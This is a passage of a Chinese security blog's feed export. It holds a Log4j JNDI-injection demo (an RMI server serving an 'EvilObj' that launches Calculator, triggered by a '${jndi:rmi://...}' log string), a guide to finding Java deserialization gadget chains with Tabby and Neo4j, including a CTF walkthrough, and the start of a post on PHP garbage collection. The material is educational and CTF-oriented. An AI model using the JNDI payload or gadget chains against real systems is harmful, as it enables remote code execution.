class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;RMI Listener 1099 port&quot;</span>);</span><br><span class="line">            <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;com.cui.log4jtest.rmi.EvilObj&quot;</span>, <span class="string">&quot;com.cui.log4jtest.rmi.EvilObj&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">            registry.rebind(<span class="string">&quot;test&quot;</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>EvilObj.java</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilObj</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;open a Calculator!&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//这里可以写任意代码，比如木马程序，病毒程序，死循环，后门程序等等。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>log4jDemo1.java</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4jDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:rmi://127.0.0.1:1099/test&#125;&quot;</span>;</span><br><span class="line">            logger.info(<span class="string">&quot;输出的信息是:&#123;&#125;&quot;</span>, str);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>先启动RMIServer再启动log4jDemo1就会弹出计算器</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072231797.jpg"                      alt="image-20221002215727110"                ><figcaption>image-20221002215727110</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072231698.jpg"                      alt="image-20221002215800340"                ><figcaption>image-20221002215800340</figcaption></figure></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tabby安装配置及使用</title>
      <link href="/2022/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7Tabby%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7Tabby%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Tabby安装配置及使用"><a href="#Tabby安装配置及使用" class="headerlink" title="Tabby安装配置及使用"></a>Tabby安装配置及使用</h1><h2 id="0x00安装"><a href="#0x00安装" class="headerlink" title="0x00安装"></a>0x00安装</h2><h3 id="Neo4j-Desktop"><a href="#Neo4j-Desktop" class="headerlink" title="Neo4j Desktop"></a>Neo4j Desktop</h3><p>官网直接下 <a class="link"   href="https://neo4j.com/download/" >Neo4j Desktop Download | Free Graph Database Download <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>下完打开初始化完可以看到数据库版本，下对应版本的APOC插件 </p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041321216.png"                      alt="image-20230501151304382"                ><figcaption>image-20230501151304382</figcaption></figure></p><h3 id="新建Neo4j图数据库"><a href="#新建Neo4j图数据库" class="headerlink" title="新建Neo4j图数据库"></a>新建Neo4j图数据库</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041321510.png"                      alt="image-20230501152338340"                ><figcaption>image-20230501152338340</figcaption></figure></p><p>可以选择更新数据库版本到5.4.0</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041321584.png"                      alt="image-20230501162942114"                ><figcaption>image-20230501162942114</figcaption></figure></p><p>打开数据库旁的<code>···</code>-&gt;<code>Settings...</code>更改以下配置</p><div class="highlight-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#允许从本地任意位置载入csv文件(大概在前面几行)</span></span><br><span class="line"><span class="comment">#server.directories.import=import</span></span><br><span class="line"><span class="comment">#允许 apoc扩展（大概在配置文件末尾部分）</span></span><br><span class="line"><span class="attr">dbms.security.procedures.unrestricted</span>=jwt.security.*,apoc.*</span><br><span class="line"><span class="comment"># 修改内存相关配置 </span></span><br><span class="line"><span class="comment"># 可以通过官方的neo4j-admin来推荐配置内存大小</span></span><br><span class="line"><span class="attr">dbms.memory.heap.initial_size</span>=<span class="number">1</span>G</span><br><span class="line"><span class="attr">dbms.memory.heap.max_size</span>=<span class="number">4</span>G</span><br><span class="line"><span class="attr">dbms.memory.pagecache.size</span>=<span class="number">4</span>G</span><br></pre></td></tr></table></figure></div><p>配置 apoc 的配置，需要找到配置文件目录，在这个目录下新建 apoc.conf 文件，内容为</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041321995.png"                      alt="image-20230501161001178"                ><figcaption>image-20230501161001178</figcaption></figure></p><div class="highlight-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apoc.import.file.enabled</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">apoc.import.file.use_neo4j_config</span>=<span class="literal">false</span></span><br></pre></td></tr></table></figure></div><p>最后，配置一下 apoc 和 tabby 插件，打开 plugins 目录将对应的 jar 复制到与上面conf同目录下的plugins目录</p><p>tabby插件：<a class="link"   href="https://github.com/wh1t3p1g/tabby/releases" >Releases · wh1t3p1g&#x2F;tabby · GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> （在env目录里,同时把env里面几个apoc的jar包都<strong>复制</strong>到plugins里）</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041321885.png"                      alt="image-20230501163440727"                ><figcaption>image-20230501163440727</figcaption></figure></p><h3 id="验证配置"><a href="#验证配置" class="headerlink" title="验证配置"></a>验证配置</h3><p>重启数据库后，open-&gt;Neo4j Browser,测试查询语句，查看一下apoc（有30项）和tabby（有两项）的配置</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041321101.png"                      alt="image-20230501163735244"                ><figcaption>image-20230501163735244</figcaption></figure></p><h3 id="简单启动"><a href="#简单启动" class="headerlink" title="简单启动"></a>简单启动</h3><p>在下载的tabby文件夹中新建一个case目录，下面放目标jar,同时修改config&#x2F;settings.properties</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041321272.png"                      alt="image-20230501190832777"                ><figcaption>image-20230501190832777</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041321030.png"                      alt="image-20230501191148762"                ><figcaption>image-20230501191148762</figcaption></figure></p><p>使用jdk8启动tabby.jar，命令行：</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xmx6g -jar tabby.jar</span><br></pre></td></tr></table></figure></div><p>可能出现的报错</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalStateException: Failed to execute CommandLineRunner</span><br><span class="line">at org.springframework.boot.SpringApplication.callRunner(SpringApplication.java:771) [spring-boot-2.7.7.jar!/:2.7.7]</span><br><span class="line">at org.springframework.boot.SpringApplication.callRunners(SpringApplication.java:752) [spring-boot-2.7.7.jar!/:2.7.7]</span><br><span class="line">at org.springframework.boot.SpringApplication.run(SpringApplication.java:314) [spring-boot-2.7.7.jar!/:2.7.7]</span><br><span class="line">at org.springframework.boot.SpringApplication.run(SpringApplication.java:1303) [spring-boot-2.7.7.jar!/:2.7.7]</span><br><span class="line">at org.springframework.boot.SpringApplication.run(SpringApplication.java:1292) [spring-boot-2.7.7.jar!/:2.7.7]</span><br><span class="line">at tabby.App.main(App.java:28) [classes!/:na]</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_341]</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_341]</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_341]</span><br><span class="line">....</span><br></pre></td></tr></table></figure></div><blockquote><p>把config&#x2F;settings.properties中的<code>tabby.cache.isDockerImportPath</code>设置为false，这个选项用于判断当前是否是docker环境,如果是本机直接使用，要设置成false</p></blockquote><h3 id="图数据库索引配置"><a href="#图数据库索引配置" class="headerlink" title="图数据库索引配置"></a>图数据库索引配置</h3><p>可以加快导入&#x2F;删除的速度，只要在Neo4j browser里运行即可</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">CREATE CONSTRAINT c1 IF NOT EXISTS FOR (c:Class) REQUIRE c.ID IS UNIQUE;</span><br><span class="line">CREATE CONSTRAINT c2 IF NOT EXISTS FOR (c:Class) REQUIRE c.NAME IS UNIQUE;</span><br><span class="line">CREATE CONSTRAINT c3 IF NOT EXISTS FOR (m:Method) REQUIRE m.ID IS UNIQUE;</span><br><span class="line">CREATE CONSTRAINT c4 IF NOT EXISTS FOR (m:Method) REQUIRE m.SIGNATURE IS UNIQUE;</span><br><span class="line">CREATE INDEX index1 IF NOT EXISTS FOR (m:Method) ON (m.NAME);</span><br><span class="line">CREATE INDEX index2 IF NOT EXISTS FOR (m:Method) ON (m.CLASSNAME);</span><br><span class="line">CREATE INDEX index3 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.CLASSNAME);</span><br><span class="line">CREATE INDEX index4 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.NAME0);</span><br><span class="line">CREATE INDEX index5 IF NOT EXISTS FOR (m:Method) ON (m.SIGNATURE);</span><br><span class="line">CREATE INDEX index6 IF NOT EXISTS FOR (m:Method) ON (m.NAME0);</span><br><span class="line">CREATE INDEX index7 IF NOT EXISTS FOR (m:Method) ON (m.NAME0, m.CLASSNAME);</span><br><span class="line">#之后可以运行下面命令来查看表库和数据库信息</span><br><span class="line">:schema </span><br><span class="line">:sysinfo </span><br></pre></td></tr></table></figure></div><h2 id="0x01简单使用"><a href="#0x01简单使用" class="headerlink" title="0x01简单使用"></a>0x01简单使用</h2><h3 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h3><p>以找cc链为例，将tabby目录下的配置文件的tabby.build.target该成commons-collections jar所在位置</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041322228.png"                      alt="image-20230504085113381"                ><figcaption>image-20230504085113381</figcaption></figure></p><p>shell运行</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xmx6g -jar tabby.jar</span><br></pre></td></tr></table></figure></div><blockquote><p>注意要使用java8</p></blockquote><p>成功连接数据库</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041322970.png"                      alt="image-20230504085210709"                ><figcaption>image-20230504085210709</figcaption></figure></p><h3 id="可能的报错"><a href="#可能的报错" class="headerlink" title="可能的报错"></a>可能的报错</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041322071.png"                      alt="image-20230504085257308"                ><figcaption>image-20230504085257308</figcaption></figure></p><blockquote><p>原因：Neo4j数据库未开启，即使数据库未开启，刚开始的info仍显示有”default”数据库</p></blockquote><p>出现下图即表示导入完毕</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041322896.png"                      alt="image-20230504085512803"                ><figcaption>image-20230504085512803</figcaption></figure></p><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><p>打开Neo4j browser，用以下语句查询CC7</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">match path=(m1:Method &#123;SIGNATURE:&quot;&lt;java.util.Hashtable: void readObject(java.io.ObjectInputStream)&gt;&quot;&#125;)-[:CALL ]-&gt;(m2:Method &#123;NAME:&quot;reconstitutionPut&quot;&#125;)-[:CALL ]-&gt;(m3:Method &#123;NAME:&quot;equals&quot;&#125;)-[:ALIAS*..2]-(m4:Method)-[:CALL ]-&gt;(m5:Method &#123;NAME:&quot;get&quot;&#125;)-[:ALIAS*1..2]-(m6:Method &#123;NAME:&quot;get&quot;&#125;)-[:CALL]-&gt;(m7:Method &#123;NAME:&quot;transform&quot;&#125;)-[:ALIAS*]-(m8:Method)-[:CALL]-&gt;(m9:Method &#123;IS_SINK:true&#125;)  return path</span><br></pre></td></tr></table></figure></div><blockquote><p>可以很明显的看到是从Hashtable的readObject为起点，hashtable反序列化时调用<strong>reconstitutionPut方法</strong>，在这个方法的执行流程中会调用equals判断key是否重复，如果调用的是AbstractMap的equals，之后会触发LazyMap的get，之后就是常规的触发transform</p></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041322187.png"                      alt="image-20230504091827921"                ><figcaption>image-20230504091827921</figcaption></figure></p><blockquote><p>查询结果节点以id显示，点击后可以在右框查看属性</p></blockquote><h4 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h4><ul><li><p>Neo4j中有三种指向：<code>() - [] -&gt; ()</code>、<code>() &lt;- [] - ()</code>和<code>() - [] - ()</code>。顾名思义，前两种就是看箭头方向表示对应的单项关系；最后一种表示双向关系</p></li><li><p>形如<code>[:CALL]</code>的可以认为给调用边起一个别名CALL</p></li><li><p>对于每个节点，SIGNATURE属性存储着完整的方法名称</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041322332.png"                      alt="image-20230504091725958"                ><figcaption>image-20230504091725958</figcaption></figure></p></li><li><p>上述查询语句中equals方法后为<code>[:ALIAS*..2]</code></p><ul><li><code>*1..N</code>的意思即为：如果在1到N层关系中存在路径，将返回开始点和结束点，若缺省开头，则默认从1开始，所以<code>[:ALIAS*..2]</code>表示找两层以内的方法</li></ul></li><li><p>在Neo4j查询语句CQL中可以设定指定方向，如<code>-[:CALL ]-&gt;</code>,而<code>-[:ALIAS*1..2]-</code>没有指定方向，说明关系内的方法只能作为alias,可以理解为从当前节点向外广度延伸以搜索能调用到下一个方法节点的调用链</p></li><li><p>每个节点都有两个属性 IS_SINK IS_SOURCE ，分别代表是否是结尾节点和起始节点</p></li></ul><p>根据查询结果很容易发现调用链</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041322538.png"                      alt="image-20230504123909760"                ><figcaption>image-20230504123909760</figcaption></figure></p><h2 id="0x02CTF中使用"><a href="#0x02CTF中使用" class="headerlink" title="0x02CTF中使用"></a>0x02CTF中使用</h2><p>上面找cc链的过程指向性比较强，在ctf中，可以利用该工具找到两个方法之间的调用链</p><h3 id="长城杯-2022-b4bycoffee"><a href="#长城杯-2022-b4bycoffee" class="headerlink" title="[长城杯 2022]b4bycoffee"></a>[长城杯 2022]b4bycoffee</h3><p>题目给出源码，反编译一下，coffeeBean的toString有个字节码后门</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041322562.png"                      alt="image-20230504124900205"                ><figcaption>image-20230504124900205</figcaption></figure></p><p>反序列化入口，跟进一下AntObjectInputStream</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041323091.png"                      alt="image-20230504125123715"                ><figcaption>image-20230504125123715</figcaption></figure></p><p>在反序列化时设置了黑名单类，过滤了这些</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException,ObjectBean,ToStringBean,TemplatesImpl,Runtime</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041323797.png"                      alt="image-20230504125216104"                ><figcaption>image-20230504125216104</figcaption></figure></p><p>现在只要触发toString，但是常用的BadAttributeValueExpException被ban了，注意到依赖中存在rome，可以用EqualsBean的hashcode方法可以触发到任意类的toString方法</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041323020.png"                      alt="image-20230504125407054"                ><figcaption>image-20230504125407054</figcaption></figure></p><p>但是这题也可以用tabby找一个readObject-&gt;toString的链子，写出以下查询语句</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME:&quot;toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks, 12, false,true) yield path where none(n in nodes(path) where n.CLASSNAME in [&quot;javax.management.BadAttributeValueExpException&quot;,&quot;com.sun.jmx.snmp.SnmpEngineId&quot;,&quot;com.sun.xml.internal.ws.api.BindingID&quot;,&quot;javax.swing.text.html.HTML$UnknownTag&quot;])</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure></div><blockquote><p>设置起始节点为HashMap的readObject，结束节点为toString方法</p><p>之后排除了BadAttributeValueExpException等方法</p><p>tabby内的findJavaGadget接口会通过污点传播，根据java原生反序列化的规则来查找利用链，个参数分别表示起始节点、结束节点、路径的最大节点数、isBackward、depthFirst</p></blockquote><p>非常清晰的jdk原生利用链</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041323655.png"                      alt="image-20230504130444449"                ><figcaption>image-20230504130444449</figcaption></figure></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a class="link"   href="https://www.ctfiot.com/64572.html" >Java代码分析工具Tabby在CTF中的运用 | CTF导航 (ctfiot.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://m0d9.me/2022/10/22/Tabby-%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/" >Tabby 源码分析 | m0d9’s blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://www.cnblogs.com/ljhdo/p/10929702.html" >Neo4j 第九篇：查询数据（Match） - 悦光阴 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>[tabby&#x2F;Tabby 食用指北.md at master · wh1t3p1g&#x2F;tabby · GitHub](<a class="link"   href="https://github.com/wh1t3p1g/tabby/blob/master/doc/Tabby" >https://github.com/wh1t3p1g/tabby/blob/master/doc/Tabby <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 食用指北.md)</p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP垃圾回收器与反序列化利用</title>
      <link href="/2022/10/20/PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/"/>
      <url>/2022/10/20/PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP垃圾回收器与反序列化利用"><a href="#PHP垃圾回收器与反序列化利用" class="headerlink" title="PHP垃圾回收器与反序列化利用"></a>PHP垃圾回收器与反序列化利用</h1><h2 id="垃圾回收机制"><a href="#垃圾回收机制" class="headerlink" title="垃圾回收机制"></a>垃圾回收机制</h2><p>指php会自动释放程序不再需要的已分配的内存块。</p><h3 id="PHP5-3之前"><a href="#PHP5-3之前" class="headerlink" title="PHP5.3之前"></a>PHP5.3之前</h3><p>采用引用计数的方式，给每个内存对象分配一个计数器，每当内存对象被引用时，计数器+1，引用撤销后(unset())，计数器-1，对技术器&#x3D;0时，对内存对象进行销毁，垃圾回收机制完成，php一个生命周期后会释放此进程&#x2F;线程所占的内容</p><p>存在问题：两个或多个对象相互引用，使得计数器永远不为0，导致内存对象无法被回收</p><h3 id="PHP5-3"><a href="#PHP5-3" class="headerlink" title="PHP5.3"></a>PHP5.3</h3><p>加入复杂算法检测引用环的存在，避免内存泄露。</p><p>每个php变量存在一个叫zval的变量容器中，存储了变量的类型和值，还存储了“is_ref”bool型变量以标识该变量是否属于引用集合；还有一个“refcount”，用于表示指向这个zval变量容器的变量个数，注意，多个变量是可以共用一个变量容器的。</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;new string&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span> = <span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;a&#x27;</span> );</span><br><span class="line"><span class="keyword">unset</span>( <span class="variable">$b</span>, <span class="variable">$c</span> );</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;a&#x27;</span> );</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>以上代码会输出</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a: (refcount=3, is_ref=0)=&#x27;new string&#x27; </span><br><span class="line">a: (refcount=1, is_ref=0)=&#x27;new string&#x27;</span><br></pre></td></tr></table></figure></div><h3 id="PHP7的NTS版本"><a href="#PHP7的NTS版本" class="headerlink" title="PHP7的NTS版本"></a>PHP7的NTS版本</h3><p>在该版本，上述通过赋值同一个变量的情况已经不会再被计数，PHP7中，zval可以被引用计数或不被引用</p><ul><li>对于null，bool，int和double的类型变量，refcount永远不会计数；</li><li>对于对象、资源类型，refcount计数和php5的一致；</li><li>对于字符串，未被引用的变量被称为“实际字符串”。而那些被引用的字符串也不计数</li><li>对于数组，未引用的变量被称为“不可变数组”。其数组本身计数与php5一致，但是数组里面的每个键值对的计数，则按前面三条的规则（即如果是字符串也不在计数）；如果使用opcache，则代码中的常量数组文字将被转换为不可变数组。</li></ul><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;测试字符串引用计数&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;new string&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;a&#x27;</span> );</span><br><span class="line"><span class="keyword">unset</span>( <span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;a&#x27;</span> );</span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;a&#x27;</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;测试数组引用计数&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;c&#x27;</span> );</span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$c</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;c&#x27;</span> );</span><br><span class="line"><span class="variable">$c</span>[<span 